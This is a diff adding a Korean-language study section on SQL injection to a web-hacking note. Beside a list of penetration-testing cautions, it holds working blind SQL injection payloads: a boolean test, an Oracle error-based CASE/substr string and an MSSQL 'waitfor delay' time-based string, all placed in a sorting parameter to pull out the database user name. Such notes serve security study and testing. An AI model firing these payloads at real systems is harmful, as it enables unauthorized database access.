@@ -63,6 +63,32 @@ or와 and 연산자
 
 ### Blind SQL Injection
 
+# sqli
+## SQL Injection Exploit
+
+## 
+웹페이지
+-> SQL 질의문을 사용하는 곳
+-> 서버 측 SQL 질의문 추론 후 공격 시도
+
+## 모의해킹 할 때 주의할 점
+1. insert, delete, update 지양
+    이 구문들에서는 or, 주석 지양
+2. 주석 남용 금지
+3. 데이터 변조 금지
+
+## 
+`65/**/and/**/1=1`
+
+order by title desc '___'
+`sotingAD=, (case+when+ascii(substr((select+user+from+dual),1,1))=0+then+1+else+(1/0)+end)`
+1/0 -> oracle error
+
+Time Based Blind SQLi
+waitfor delay
+order by ___
+`sotingAD=ASC;if+substring((select%20user_name()),1,1)=%27a%27+waitfor+delay+%270:0:1%27&startDt=&endDt=&keyword=`
+
 # 인증 우회
 * brute force: 무작위 대입 공격
 * 사전 대입 공격
